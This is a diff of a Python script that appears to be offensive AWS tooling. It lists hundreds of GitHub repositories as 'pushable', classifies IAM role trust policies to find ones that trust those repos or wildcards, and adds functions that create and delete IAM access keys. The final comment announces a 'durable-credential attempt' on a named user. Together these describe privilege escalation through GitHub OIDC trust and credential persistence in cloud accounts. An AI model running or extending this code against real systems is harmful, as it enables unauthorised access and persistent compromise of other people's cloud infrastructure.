@@ -38,7 +38,7 @@ import xml.etree.ElementTree as ET
 
 REGION = os.environ.get('AWS_REGION') or os.environ.get('AWS_DEFAULT_REGION') or 'eu-west-2'
 SELF_ACCOUNT_HINT = '589761922677'
-SESS = 'c211-i121316'
+SESS = 'c211-i121584'
 
 PUSHABLE_REPOS = ["afundiedgar/afundiedgar", "afundiedgar/afundios", "afundiedgar/agency-agents", "afundiedgar/agents-course", "afundiedgar/agentscope", "afundiedgar/aggr", "afundiedgar/ai-for-beginners", "afundiedgar/ai-researcher", "afundiedgar/alembic", "afundiedgar/asi-arch", "afundiedgar/autoresearch", "afundiedgar/axelor-open-platform", "afundiedgar/axelor-open-suite", "afundiedgar/bitaxe", "afundiedgar/bitnet", "afundiedgar/cam", "afundiedgar/claude-code", "afundiedgar/claw-code", "afundiedgar/context-hub", "afundiedgar/cosmos", "afundiedgar/crma", "afundiedgar/ctt", "afundiedgar/cursor", "afundiedgar/deepseek-r1", "afundiedgar/deepseek-v3", "afundiedgar/devdocs", "afundiedgar/dotfiles", "afundiedgar/etft", "afundiedgar/fancy_job", "afundiedgar/fineract", "afundiedgar/fineract-microservice", "afundiedgar/fineract-paymenthub-adapter", "afundiedgar/finvizfinance", "afundiedgar/firecrawl", "afundiedgar/flow_s", "afundiedgar/flows", "afundiedgar/fms", "afundiedgar/frankestein", "afundiedgar/full-stack-fastapi-template", "afundiedgar/gbrain", "afundiedgar/gemini-cli", "afundiedgar/gemini-fullstack-langgraph-quickstart", "afundiedgar/hermes-agent", "afundiedgar/hexstrike-ai", "afundiedgar/hrm", "afundiedgar/it", "afundiedgar/jobs", "afundiedgar/kentok", "afundiedgar/koboldcpp", "afundiedgar/langchain", "afundiedgar/langgraph", "afundiedgar/lets-bet", "afundiedgar/litellm", "afundiedgar/llama-factory", "afundiedgar/llmfit", "afundiedgar/memba1ui", "afundiedgar/mirofish", "afundiedgar/moneyprinterturbo", "afundiedgar/mtra", "afundiedgar/n8n-workflows", "afundiedgar/n8n-workflows1", "afundiedgar/nanoclaw", "afundiedgar/nexus-intelligence", "afundiedgar/om1", "afundiedgar/openbb", "afundiedgar/openfang", "afundiedgar/opensandbox", "afundiedgar/pentagi", "afundiedgar/pentest-mcp", "afundiedgar/picheck", "afundiedgar/posti", "afundiedgar/posti-private", "afundiedgar/qlib", "afundiedgar/qwen-code", "afundiedgar/rag-anything", "afundiedgar/rea", "afundiedgar/report_builder", "afundiedgar/ryansprojects", "afundiedgar/ryle", "afundiedgar/rylewa", "afundiedgar/sensenova-u1", "afundiedgar/sn", "afundiedgar/thefatrat", "afundiedgar/thematic", "afundiedgar/vt-etw", "afundiedgar/wan2.2", "afundiedgar/wm", "afundiedgar/worldmonitor", "ai4bharat/indicvoices", "ai4bharat/sruti", "ajua-labs/ajua_report_builder", "ajua-labs/api-service", "ajua-labs/engine3.0", "ajua-labs/enterprise_warehouse", "ajua-labs/new-ui", "ajua-labs/properties", "ajua-labs/scheduler", "ajua-labs/webforms-ui", "amiroyottt/amiroyottt", "amiroyottt/amiroyottt.github.io", "amiroyottt/ci-utils", "amiroyottt/le-roi-du-drain", "amiroyottt/qui-est-le-roi-du-drain", "amiroyottt/roi-du-drain-france", "amiroyottt/waste-less", "amiroyottt/who-is-the-king-of-drain", "amiroyottt/xodrain", "ashwinsankar17/bodhan_gen_ai_tools", "ashwinsankar17/clove-deployment", "c14-inatel/api_search", "c14-inatel/api_search_frontend", "cloud-webide/.github", "cloud-webide/cloud-webide.github.io", "cloud-webide/demo-repository", "cloud-webide/pages-demo", "cloud-webide/qwen-code-review-benchmark", "codingstarind/may2026-team-092", "da5401-jul-nov-2025/assignment-1-venkat-shadeslayer", "da5401-jul-nov-2025/assignment-2-venkat-shadeslayer", "da5401-jul-nov-2025/assignment-3-venkat-shadeslayer", "da5402-mlops-jan26/assignment-1-venkat-shadeslayer", "da5402-mlops-jan26/assignment-2-ns26z109-be22b042", "da5402-mlops-jan26/assignment-3-venkat-shadeslayer", "da5402-mlops-jan26/assignment-5-venkat-shadeslayer", "da5402-mlops-jan26/assignment-6-venkat-shadeslayer", "da5402-mlops-jan26/assignment-7-venkat-shadeslayer", "da5402-mlops-jan26/assignment-8-venkat-shadeslayer", "datafe/opencode", "ddl-nick-goble/cc-fraud-adaboost-tuning2-repo", "ddl-nick-goble/csv-exporter", "ddl-nick-goble/fraud-detection-template", "ddl-nick-goble/fsi-demo", "ddl-nick-goble/fsi-risk-modeling-template", "ddl-nick-goble/fsi-starter-template", "ddl-nick-goble/gfmiboston2026", "ddl-nick-goble/gfmisept2026", "ddl-nick-goble/modelriskpeerforumtoronto2026", "ddl-nick-goble/quant-development", "ddl-nick-goble/quantitative-development", "ddl-nick-goble/react-app-examples", "ddl-nick-goble/sceqc", "ddl-nick-goble/security-dashboard", "ddl-nick-goble/testrepodeletenow", "dms-ksa/chameleon-service", "dms-ksa/cheetah-service", "dms-ksa/elephant", "dms-ksa/event-service", "dms-ksa/falcon-service", "dms-ksa/fox-service", "dms-ksa/fuse-react-skeleton", "dms-ksa/location-service", "dms-ksa/lynxai-service", "dms-ksa/notification-service", "dms-ksa/octopus-service", "dms-ksa/orca-service", "dms-ksa/owl-service", "dms-ksa/prod-argocd", "dms-ksa/rabbit-service", "dms-ksa/rope-tracker-adb", "dms-ksa/smart-sense", "dms-ksa/spider-howen", "dms-ksa/spider-jimiiot", "dms-ksa/spider-meitrack-iridium", "dms-ksa/spider-queclink", "dms-ksa/spider-rope", "dms-ksa/spider-ruptela", "dms-ksa/spider-seeworld", "dms-ksa/spider-teltonika", "dms-ksa/spider-teltonika-avlview", "dms-ksa/spider-teltonika-ble", "dms-ksa/spider-teltonika-go", "dms-ksa/spider-teltonika-iridium", "dms-ksa/spider-teltonika-reborn", "dms-ksa/spider-teltonika-tcp", "dms-ksa/spider-tzone-lora", "dms-ksa/spider-vanguard", "dms-ksa/spider-venom", "dms-ksa/summary-service", "dms-ksa/wasl-service", "dms-ksa/whale-service", "domino-field/excel-model-registry", "eaprime1/0ad_v", "eaprime1/agent-of-empires", "eaprime1/agent-resources-project", "eaprime1/ai-starter-kit", "eaprime1/antigravity-awesome-skills", "eaprime1/antigravity-kit", "eaprime1/archivum", "eaprime1/ashkharh", "eaprime1/auto-claude", "eaprime1/awesome-open-source-games", "eaprime1/claude-code-action", "eaprime1/codacy-skills", "eaprime1/consortium", "eaprime1/constellation_project_tracker", "eaprime1/convertx", "eaprime1/cookbook_gemini", "eaprime1/cradle", "eaprime1/custos", "eaprime1/duplicatus", "eaprime1/essence_engine", "eaprime1/eternal_naught_space", "eaprime1/exchange", "eaprime1/fleet-commander", "eaprime1/gamemaster", "eaprime1/gamification", "eaprime1/gemini-fullstack-langgraph-quickstart", "eaprime1/gemini_cli_notion_extention", "eaprime1/genai-processors", "eaprime1/github-mcp-server", "eaprime1/gravitar", "eaprime1/grayshore", "eaprime1/grok-cli", "eaprime1/gubernaculum", "eaprime1/hodie", "eaprime1/http-fs-file-server", "eaprime1/knowledge-work-plugins", "eaprime1/mandelbrot", "eaprime1/maw", "eaprime1/md-ai", "eaprime1/mindiai", "eaprime1/mulberry", "eaprime1/naught", "eaprime1/navigo", "eaprime1/nexusiam", "eaprime1/now", "eaprime1/nullus", "eaprime1/old_tiezerk", "eaprime1/open-thoughts", "eaprime1/openage", "eaprime1/pandora", "eaprime1/perplexity-cli", "eaprime1/pixelator", "eaprime1/plexus", "eaprime1/portofentry", "eaprime1/prima", "eaprime1/primal_codex", "eaprime1/prime", "eaprime1/primordium", "eaprime1/pryme", "eaprime1/python", "eaprime1/python-thursday-adventure", "eaprime1/python_mini_metro_v", "eaprime1/qtelegard", "eaprime1/qtermux", "eaprime1/queue", "eaprime1/radix", "eaprime1/relational_coherence_navigator", "eaprime1/runexusiam", "eaprime1/skills-introduction-to-github", "eaprime1/spectorium", "eaprime1/sphincter", "eaprime1/sphinx", "eaprime1/starter-applets", "eaprime1/tabularium", "eaprime1/termux-app", "eaprime1/the", "eaprime1/tiezerk", "eaprime1/tmux", "eaprime1/ultima_server", "eaprime1/unexusi", "eaprime1/unexusi-claude", "eaprime1/unexusi_anex", "eaprime1/unexusi_dynamic_narrative", "eaprime1/unexusi_fortran", "eaprime1/veo-3-nano-banana-gemini-api-quickstart", "eaprime1/visionary_termux", "eaprime1/widelands", "eaprime1/wl_addons_server", "freedom-angel-corp/brain-dump", "inovation-logic-solutions/system-market-backend", "inovation-logic-solutions/system-market-backend-v2", "inovation-logic-solutions/systemmarket-frontend", "inovation-logic-solutions/upforme", "jayden3316/cognitive_load", "kinetik-automotive-ltd/azure-functions", "kinetik-automotive-ltd/go-kart-ui-2", "kinetik-automotive-ltd/motorcycle-dashboard-ui", "kinetik-automotive-ltd/telemetry2go-be", "kinetik-automotive-ltd/telemetry2go-ui", "kinetik-automotive-ltd/volvo_dashboard", "luanpirr3/app_academico", "luanpirr3/cybersecurity", "luanpirr3/html-simula_comissao_variavel", "luanpirr3/importdbmysqlcsv_bonifacio1", "luanpirr3/importdbmysqlcsv_bonifacio2", "luanpirr3/java", "luanpirr3/java-cryptography", "luanpirr3/java-jdbc", "luanpirr3/java-personal-safe", "luanpirr3/java-randon-password-generate", "luanpirr3/java-socketcomunication", "luanpirr3/java-time-insertion-and-search-array", "luanpirr3/kotlin-tuneel-with-docker", "luanpirr3/luanpirr3", "luanpirr3/mysql-database", "luanpirr3/pcmania", "luanpirr3/projectc07_systemmarket", "luanpirr3/python-computervision", "luanpirr3/python-convert_mp4_to_mp3", "luanpirr3/python-detector_de_quedas", "luanpirr3/python-leitor_dbmysql", "luanpirr3/semlimite", "luanpirr3/spring_boot_accessing_data_with_mysql", "luanpirr3/spring_boot_api_restful_web_service", "luanpirr3/sql-backupmsql-fastapi-", "maxwell-ipeni/dream-again-foundation", "me50/afundiedgar", "midnghtsapphire/-name-", "midnghtsapphire/agent-of-empires", "midnghtsapphire/agent-site", "midnghtsapphire/ai-architecture-new", "midnghtsapphire/aloha-board", "midnghtsapphire/amazon-books", "midnghtsapphire/audrey-evans-official", "midnghtsapphire/auky", "midnghtsapphire/auky-slack", "midnghtsapphire/awesome-cli-coding-agents", "midnghtsapphire/awesome-opensource-boilerplates", "midnghtsapphire/balls-brand-kit", "midnghtsapphire/bitcoin-channel-lab", "midnghtsapphire/bodyfinders", "midnghtsapphire/bom-me", "midnghtsapphire/bot-builder-vault", "midnghtsapphire/case-files", "midnghtsapphire/caveman", "midnghtsapphire/ceremony-spark-toolkit", "midnghtsapphire/claude-code-hooks-mastery", "midnghtsapphire/claude-skills-governance-risk-and-compliance", "midnghtsapphire/claw-code", "midnghtsapphire/clawe", "midnghtsapphire/cozy-haven-hub", "midnghtsapphire/dbarchitect-bot", "midnghtsapphire/deck-to-video-kit", "midnghtsapphire/eco-anchor-site", "midnghtsapphire/figs-wine-honey", "midnghtsapphire/food-freedom-ai", "midnghtsapphire/forensic-text-recovery", "midnghtsapphire/forensicfinders", "midnghtsapphire/git-fleet", "midnghtsapphire/github", "midnghtsapphire/github-free-toolkit", "midnghtsapphire/github-free-toolkit-pro", "midnghtsapphire/global-fusion-console", "midnghtsapphire/global-fusion-digest", "midnghtsapphire/gmail-organizer", "midnghtsapphire/gold-of-crete", "midnghtsapphire/grok-api-demo", "midnghtsapphire/growlingeyes", "midnghtsapphire/guardaio", "midnghtsapphire/hunger-gallows", "midnghtsapphire/image-permissions", "midnghtsapphire/instant-ordain-certificate-pro", "midnghtsapphire/kdp-packager", "midnghtsapphire/kimi-bot", "midnghtsapphire/linear-a", "midnghtsapphire/linear-a-sources", "midnghtsapphire/manus", "midnghtsapphire/manus-fleets", "midnghtsapphire/manus-recovery", "midnghtsapphire/mcp-affiliate", "midnghtsapphire/mcp-kubernetes", "midnghtsapphire/medusa2", "midnghtsapphire/meetaudreyevans-dashboard", "midnghtsapphire/midnghtsapphire", "midnghtsapphire/movement-observation", "midnghtsapphire/neighborly-services", "midnghtsapphire/neuro-adaptive-app", "midnghtsapphire/neurooz", "midnghtsapphire/nomad-navigator", "midnghtsapphire/oath-gate-connect", "midnghtsapphire/oaudrey-pages", "midnghtsapphire/oaudrey-site", "midnghtsapphire/ocean2-v2-research", "midnghtsapphire/openaudrey", "midnghtsapphire/openclaw-medical-skills", "midnghtsapphire/openclaw_digitalocean", "midnghtsapphire/perplexity-ai", "midnghtsapphire/playlist-atlas", "midnghtsapphire/portfolio-inventory", "midnghtsapphire/puxxle", "midnghtsapphire/reese-reviews", "midnghtsapphire/research-rodney-fleet", "midnghtsapphire/revvel-bots-private", "midnghtsapphire/revvel-hail", "midnghtsapphire/revvel-market-scout-gha", "midnghtsapphire/revvel-metal-findings", "midnghtsapphire/revvel-standards", "midnghtsapphire/risingaloha", "midnghtsapphire/roo-code", "midnghtsapphire/rvvel", "midnghtsapphire/scribes-of-the-palace", "midnghtsapphire/script-sweep", "midnghtsapphire/searchcrew-libraries", "midnghtsapphire/searchcrew-library", "midnghtsapphire/sense-strata-ledger", "midnghtsapphire/sensecrew-workspace-backup", "midnghtsapphire/sleuthkit", "midnghtsapphire/strata-mapping", "midnghtsapphire/tartaria-tablets", "midnghtsapphire/trawl", "midnghtsapphire/wedlock-wizard-mobile", "midnghtsapphire/wr-4600-photon-bench", "midnghtsapphire/xcodebuildmcp", "midnghtsapphire/zero-startup-dictionary", "midnghtsapphire/zero-startup-field-guide", "midnghtsapphire/zeroqueue-governance", "modelstudioai/openwork", "nature-magic-hkmo-team/aistudio", "nature-magic-hkmo-team/gcloud", "nature-magic-hkmo-team/nature-magic", "nature-magic-hkmo-team/nature-magic-react", "nature-magic-hkmo-team/naturemagic", "nature-magic-hkmo-team/snowmytech", "nature-magic-tech/a2a", "nature-magic-tech/agents", "nature-magic-tech/apitools", "nature-magic-tech/awesome-codex-subagents", "nature-magic-tech/azure-cli", "nature-magic-tech/azure-quickstart-templates", "nature-magic-tech/claude-plugins-community", "nature-magic-tech/claude-plugins-official", "nature-magic-tech/demo-repository", "nature-magic-tech/gcloud-mcp", "nature-magic-tech/knowledge-work-plugins", "nature-magic-tech/mytools-desktop", "nature-magic-tech/naturemagic-ssg", "nature-magic-tech/swift-markdown-ui", "nature-magic-tech/xcode-cloud", "nature-magic/cloudflare", "nature-magic/demo-repository", "nature-magic/nature-magic-react-router-starter", "noon-otter/claude_playground", "panshul069/metrics-repo", "pathway-team-18/pathway-high-prep-baseline", "portprojetoautomacao-debug/alteradodployhttps-github.com-thiagobodevanadv-alt-multi-agent-custom-automation-engine-solution", "portprojetoautomacao-debug/assistente-jur-dico-principal", "portprojetoautomacao-debug/assistente-jur-dico-principal222", "portprojetoautomacao-debug/assistente-jur-dico-principalrepli", "portprojetoautomacao-debug/assistentejuridicotype", "portprojetoautomacao-debug/https-github.com-thiagobodevanadv-alt-assistente-jur-dico-principal", "portprojetoautomacao-debug/meu-https-github.com-microsoft-container-migration-solution-accelerator", "portprojetoautomacao-debug/meu-https-github.com-microsoft-multi-agent-custom-automation-engine-solution-accelerator", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-agentic-applications-for-unified-data-foundation-solution-accelerator", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-customer-chatbot-solution-accelerator", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-deploy-your-ai-application-in-production", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-document-generation-solution-accelerator", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-document-knowledge-mining-solution-accelerator", "portprojetoautomacao-debug/modelocodespace", "portprojetoautomacao-debug/oidc-fork-probe", "portprojetoautomacao-debug/oidc-probe3", "portprojetoautomacao-debug/qwenllm", "portprojetoautomacao-debug/qwenllm2", "portprojetoautomacao-debug/repocto", "portprojetoautomacao-debug/thiagobodevanadv-alt-assistente-jur-dico-principal", "qqqys/qwen-bot", "qwen-code-review-bot/dao-2048", "qwen-code-review-bot/jianshen", "qwen-code-review-bot/mint-ui", "qwen-code-review-bot/qwen-code", "qwen-code-review-bot/ruoyun0214.github.io", "qwen-code-review-bot/task-functions", "qwen-code-review-bot/vue-docker-demo", "qwenlm/qwen-code", "qwenlm/qwen-code-action", "qwenlm/qwen-code-docs", "qwenlm/qwen-live-harness", "rashkopetrov/vagrant-for-development", "roovy54/tool-retriever", "sakshi-joshi-30/crisper_whisper", "sakshi-joshi-30/orf-model-full", "sakshi-joshi-30/sakshi-joshi-30.github.io", "sakshi-joshi-30/verbatim-mode-training", "scriptex/2048", "scriptex/animateme", "scriptex/async-array-prototype", "scriptex/at-the-wall", "scriptex/atanas.info", "scriptex/attr-i18n", "scriptex/awesome-useless-websites", "scriptex/batty-flight", "scriptex/calendar-widget", "scriptex/chops", "scriptex/create-pwa", "scriptex/css-diagnostics", "scriptex/dator", "scriptex/deno-rest-api", "scriptex/energo-pro-alerts", "scriptex/entra-docs", "scriptex/eon-feh-logo", "scriptex/eon-home-api-docs", "scriptex/express-watch-file", "scriptex/freelance-salary-calculator", "scriptex/ga-beacon", "scriptex/github-contributions-snake", "scriptex/github-insights", "scriptex/github-pages-vuepress", "scriptex/gitlab-calendar", "scriptex/hilarious-css", "scriptex/hover-media-query", "scriptex/html-head-component", "scriptex/html5-form-validator", "scriptex/initial-commit", "scriptex/introscroll", "scriptex/itcss", "scriptex/itscss", "scriptex/kata-machine", "scriptex/lastfm-ts-api", "scriptex/localga", "scriptex/log", "scriptex/mama-culinar", "scriptex/material-snake", "scriptex/material-tetris", "scriptex/no-html", "scriptex/node-jimp-watermark", "scriptex/node-rest-api", "scriptex/node-rest-example", "scriptex/npm-maintainer", "scriptex/npm-stats", "scriptex/package-info", "scriptex/parcel-mpa", "scriptex/pass-score", "scriptex/postcss-watch-folder", "scriptex/random-splice", "scriptex/react-accordion-ts", "scriptex/react-carousel", "scriptex/react-dropper", "scriptex/react-round-carousel", "scriptex/react-svg-donuts", "scriptex/react-template-ts", "scriptex/rollup-mpa", "scriptex/round-carousel-component", "scriptex/scriptex", "scriptex/scss-goodies", "scriptex/social-header", "scriptex/socials", "scriptex/sod", "scriptex/sod-legacy", "scriptex/stefan", "scriptex/svg-symbol-sprite", "scriptex/svg64", "scriptex/svgo-add-viewbox", "scriptex/svgo-bimi", "scriptex/svgo-viewbox", "scriptex/touchsweep", "scriptex/ts-helpers", "scriptex/typed-usa-states", "scriptex/universal-github-client", "scriptex/uptime", "scriptex/url-shortener", "scriptex/vik-varna-alerts", "scriptex/weather-app", "scriptex/weathex", "scriptex/webpack-mpa", "scriptex/webpack-mpa-next", "scriptex/webpack-mpa-ts", "scriptex/written-by-a-human-being", "skysze-polyu/.github", "skysze-polyu/company", "skysze-polyu/foundry-github-copilot-sdk", "skysze-polyu/frontier-ghcp-rvas", "skysze-polyu/mcp", "skysze-polyu/mistral-vibe", "skysze-polyu/muse-system-files", "skysze-polyu/nature-magic", "skysze-polyu/nature-magic-website", "skysze-polyu/password-manager-resources", "skysze-polyu/skills-introduction-to-github", "skysze-polyu/skysze-polyu", "skysze-polyu/snowmy-kubernetes", "skysze-polyu/vscode-extension-samples", "snowmy-tech/.github-private", "snowmy-tech/agent-client-protocol", "snowmy-tech/agent-framework", "snowmy-tech/agent-host-protocol", "snowmy-tech/agents", "snowmy-tech/azure-dev", "snowmy-tech/claude-code", "snowmy-tech/claude-plugins-community", "snowmy-tech/claude-plugins-official", "snowmy-tech/client-python", "snowmy-tech/client-ts", "snowmy-tech/codex", "snowmy-tech/codex-universal", "snowmy-tech/cookbook", "snowmy-tech/copilot-sdk", "snowmy-tech/coreai-models", "snowmy-tech/docs", "snowmy-tech/foundry-samples", "snowmy-tech/foundry-toolkit", "snowmy-tech/frontier-ai-starter-kit-rvas", "snowmy-tech/github-issue-manager", "snowmy-tech/knowledge-work-plugins", "snowmy-tech/microsoft-365-agents-toolkit-samples", "snowmy-tech/mistral-vibe", "snowmy-tech/multi-agent-custom-automation-engine-solution-accelerator", "snowmy-tech/muse", "snowmy-tech/octokit.swift", "snowmy-tech/openai-agents-js", "snowmy-tech/openai-agents-python", "snowmy-tech/openai-responses-starter-app", "snowmy-tech/origamicraftingadynamictutorialforappleintelligence", "snowmy-tech/platform-docs-public", "snowmy-tech/react-native-macos", "snowmy-tech/search-starter-app", "snowmy-tech/skills-getting-started-with-github-copilot", "snowmy-tech/zcode", "supbonifacio2/import_database_loja1", "supbonifacio2/import_database_loja2", "supbonifacio2/supbonifacio2", "supermercado-bonifacio/api-supermarket-store1", "supermercado-bonifacio/api-supermarket-store2", "surajvkulkarni/browser-use", "surajvkulkarni/examples", "surajvkulkarni/fastapi", "surajvkulkarni/jugaad-data", "surajvkulkarni/leetcodedailymay", "surajvkulkarni/next.js-projects-build-an-issue-tracker", "surajvkulkarni/surajvkulkarni.github.io", "surajvkulkarni/tg-archive", "swadeshb-iitm/da6400-reinforcement-learning", "swadeshb-iitm/devrev-project", "tensorteen/baseline-pipeline", "tensorteen/pathway-team-18", "venkat-shadeslayer/ai4bharat", "venkat-shadeslayer/asr-rl", "venkat-shadeslayer/assignment4", "venkat-shadeslayer/chakra", "venkat-shadeslayer/da5401_assignment5", "venkat-shadeslayer/da5401_assignment6", "venkat-shadeslayer/da5401_assignment7", "venkat-shadeslayer/da5401_assignment8", "venkat-shadeslayer/da5401_final", "venkat-shadeslayer/exasol_hackathon", "venkat-shadeslayer/gcrl_ddp", "venkat-shadeslayer/hindi-streaming-translation", "venkat-shadeslayer/mcq_generator", "venkat-shadeslayer/ml_personal", "venkat-shadeslayer/mlops-da5402", "venkat-shadeslayer/mlops_final", "venkat-shadeslayer/pathway-high-prep-baseline", "venkat-shadeslayer/primemart-enthusiasts", "venkat-shadeslayer/rarl", "venkat-shadeslayer/reinforcement_learning_tb", "venkat-shadeslayer/rl_from_scratch", "venkat-shadeslayer/unsupervised-skill-discovery", "venkat-shadeslayer/zero_to_hero-all_hail_ak", "wolowizard-11/parta-final", "wpcomvip/dan-ariely-danariely-com", "xiaomizhoubaobei/302_image_toolbox", "xiaomizhoubaobei/60s", "xiaomizhoubaobei/ai-chat", "xiaomizhoubaobei/aipoxny", "xiaomizhoubaobei/artalk", "xiaomizhoubaobei/astrbot-plugin-song-voice", "xiaomizhoubaobei/astrbot_plugin-ceshi", "xiaomizhoubaobei/astrbot_plugin_blackjack", "xiaomizhoubaobei/astrbot_plugin_emojis", "xiaomizhoubaobei/astrbot_plugin_gitpulse", "xiaomizhoubaobei/astrbot_plugin_interactive", "xiaomizhoubaobei/astrbot_plugin_manosaba-memes", "xiaomizhoubaobei/astrbot_plugin_models_ai", "xiaomizhoubaobei/astrbot_plugin_ots_memory", "xiaomizhoubaobei/astrbot_plugin_treasure_bag", "xiaomizhoubaobei/astro", "xiaomizhoubaobei/ci-evidence-pack", "xiaomizhoubaobei/comfyui-workflow", "xiaomizhoubaobei/deep-research", "xiaomizhoubaobei/edge-ai-gateway", "xiaomizhoubaobei/eo-counter", "xiaomizhoubaobei/hanlp", "xiaomizhoubaobei/image-generator-starter", "xiaomizhoubaobei/image_toolbox", "xiaomizhoubaobei/llm-playground", "xiaomizhoubaobei/lumin-core", "xiaomizhoubaobei/lumincore", "xiaomizhoubaobei/mizhou-sts-service", "xiaomizhoubaobei/mnn", "xiaomizhoubaobei/mnn-1", "xiaomizhoubaobei/mz-mcp", "xiaomizhoubaobei/mzapi-android", "xiaomizhoubaobei/mzapi-api", "xiaomizhoubaobei/mzapi-cpp", "xiaomizhoubaobei/mzapi-go", "xiaomizhoubaobei/mzapi-java", "xiaomizhoubaobei/mzapi-net", "xiaomizhoubaobei/mzapi-php", "xiaomizhoubaobei/mzapi-python", "xiaomizhoubaobei/mzapi-swift", "xiaomizhoubaobei/mzapi-ts", "xiaomizhoubaobei/mzwiki", "xiaomizhoubaobei/prompt_generator", "xiaomizhoubaobei/qq-bot", "xiaomizhoubaobei/rsshub", "xiaomizhoubaobei/video-generator-public", "xiaomizhoubaobei/video_translation", "xiaomizhoubaobei/waline", "xiaomizhoubaobei/wiki", "xiaomizhoubaobei/womenhealth-app", "xiaomizhoubaobei/womenhealth-web", "xiaomizhoubaobei/xiaomizhoubaobei", "xiaomizhoubaobei/xmzai-android-app", "yiliang114/aionui", "yiliang114/aionui-vscode", "yiliang114/arithmetic", "yiliang114/awesome-deepseek-harness", "yiliang114/awesome-dsh-plugin", "yiliang114/azuredatastudio", "yiliang114/byte.yiliang.site", "yiliang114/camo-test", "yiliang114/cc-switch", "yiliang114/chinese-independent-blogs", "yiliang114/claude-code", "yiliang114/code-agents", "yiliang114/code-server", "yiliang114/core", "yiliang114/cpa-config", "yiliang114/darc", "yiliang114/deemon", "yiliang114/developer", "yiliang114/dsh-session-deck", "yiliang114/easytrader", "yiliang114/gc", "yiliang114/github-activity-readme", "yiliang114/harness-perf-benchmark", "yiliang114/herdr", "yiliang114/img-host", "yiliang114/issue-assets", "yiliang114/kimi-code", "yiliang114/learn-quant", "yiliang114/llm-proxy", "yiliang114/magpie", "yiliang114/midway", "yiliang114/monorepo-turborepo", "yiliang114/mumeral.js", "yiliang114/oh-my-pi", "yiliang114/omp-web", "yiliang114/open-ppt-skill", "yiliang114/opencode", "yiliang114/projj", "yiliang114/quant", "yiliang114/qwen-code", "yiliang114/qwen-code-action", "yiliang114/qwen-code-examples", "yiliang114/qwen-code-lsp-demo", "yiliang114/rea", "yiliang114/rettiwt-api", "yiliang114/rspack", "yiliang114/skills", "yiliang114/start-nest-v3-w6h2", "yiliang114/starter-vscode", "yiliang114/strapi-nextjs-corporate-starter-1", "yiliang114/task-functions", "yiliang114/tasks", "yiliang114/tokei", "yiliang114/unpkg-white-list", "yiliang114/vite-monaco-editor", "yiliang114/vite-plugin-mkcert", "yiliang114/vscode", "yiliang114/vscode-docs", "yiliang114/vscode-mk", "yiliang114/vscode-pyolite", "yiliang114/vscode-ts-uml", "yiliang114/vue-thanos-snap", "yiliang114/xterm.js", "yiliang114/yiliang114", "yiliang114/yiliang114.github.io", "yiliang114/zeromq.js", "yiliang114/zhinang-cr-bot", "yiliang114/zhouz", "yuseinkerdakov/html-practice", "yuseinkerdakov/three-11", "zoyaatanasova/zoyaworld"]
 
@@ -447,6 +447,36 @@ def iam_list_access_keys(cr, user):
     return keys, {'status': r['status'], 'code': err_code(r), 'msg': err_msg(r)}
 
 
+def iam_create_access_key(cr, user):
+    """ONE bounded iam:CreateAccessKey. The secret key is NEVER printed; only sha256/prefix
+    metadata is recorded. Returns (record, creds_or_None)."""
+    r = signed('iam', 'CreateAccessKey', {'UserName': user}, 'us-east-1', '2010-05-08', cr,
+               host='iam.amazonaws.com')
+    root = xml_root(r['body'])
+    rec = {'user': user, 'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 700)}
+    ak = sk = ''
+    if root is not None:
+        m = root.find('.//AccessKey')
+        if m is not None:
+            ak = (m.findtext('AccessKeyId') or '').strip()
+            sk = (m.findtext('SecretAccessKey') or '').strip()
+    if ak and sk:
+        rec['key_returned'] = True
+        rec['ak_prefix12'] = ak[:12]
+        rec['ak_len'] = len(ak)
+        rec['ak_sha256'] = hashlib.sha256(ak.encode()).hexdigest()
+        rec['sk_sha256'] = hashlib.sha256(sk.encode()).hexdigest()
+        return rec, {'ak': ak, 'sk': sk, 'tok': ''}
+    rec['key_returned'] = False
+    return rec, None
+
+
+def iam_delete_access_key(cr, user, ak):
+    r = signed('iam', 'DeleteAccessKey', {'UserName': user, 'AccessKeyId': ak},
+               'us-east-1', '2010-05-08', cr, host='iam.amazonaws.com')
+    return {'status': r['status'], 'code': err_code(r), 'msg': cap(err_msg(r), 300)}
+
+
 def iam_list_attached_user_policies(cr, user):
     r = signed('iam', 'ListAttachedUserPolicies', {'UserName': user}, 'us-east-1',
                '2010-05-08', cr, host='iam.amazonaws.com')
@@ -558,6 +588,47 @@ def cognito_getid(pool):
                 'body': cap(e.read().decode('utf-8', 'replace'), 300)}
     except Exception as e:
         return {'pool': pool, 'status': None, 'error': repr(e)[:150]}
+
+
+
+def classify_trusts(compact, account):
+    """(a) names a repo/owner we can push to, (b) repo wildcard, (c) another AWS
+    account principal, (d) non-GitHub federated principal (OIDC/Cognito/SAML),
+    (e) same-account/service/non-federated. A role may carry several classes."""
+    pushset = set(PUSHABLE_REPOS)
+    ownerset = set(x.split('/')[0] for x in PUSHABLE_REPOS)
+    classes = []
+    for c in compact:
+        cls = []
+        for pat in (c.get('gh_sub_patterns') or []):
+            s = str(pat).strip()
+            m = re.match(r'^repo:([^/:]+)/([^/:]+)', s)
+            if s in ('*', 'repo:*', 'repo:*/*'):
+                cls.append('b')
+            elif m:
+                o, rp = m.group(1).lower(), m.group(2).lower()
+                full = o + '/' + rp
+                if rp == '*':
+                    cls.append('b')
+                elif full in pushset or o in ownerset:
+                    cls.append('a')
+                else:
+                    cls.append('a-elsewhere')
+        for x in (c.get('principals') or []):
+            if x.startswith('AWS:'):
+                m = re.search(r'arn:aws:iam::(\d{12}):', x)
+                if m and m.group(1) != account:
+                    cls.append('c')
+            elif x.startswith('Federated:'):
+                if 'token.actions.githubusercontent.com' not in x:
+                    cls.append('d')
+            elif x.startswith('Service:'):
+                cls.append('e-service')
+        if not cls:
+            cls.append('e')
+        classes.append({'role': c['role'], 'class': sorted(set(cls)),
+                        'gh_sub_patterns': (c.get('gh_sub_patterns') or [])[:3]})
+    return classes
 
 
 # ---------------------------------------------------------------- trust join
@@ -997,6 +1068,41 @@ def main():
                    'attached': ap, 'inline': ip, 'keys_status': kinfo})
         say('IAM_USER', json.dumps(uk[-1])[:900])
     out['users'] = json.dumps({'status': uinfo, 'users': uk})[:16000]
+
+    # 3b-bis) ONE bounded durable-credential attempt: iam:CreateAccessKey on e2e-test-user
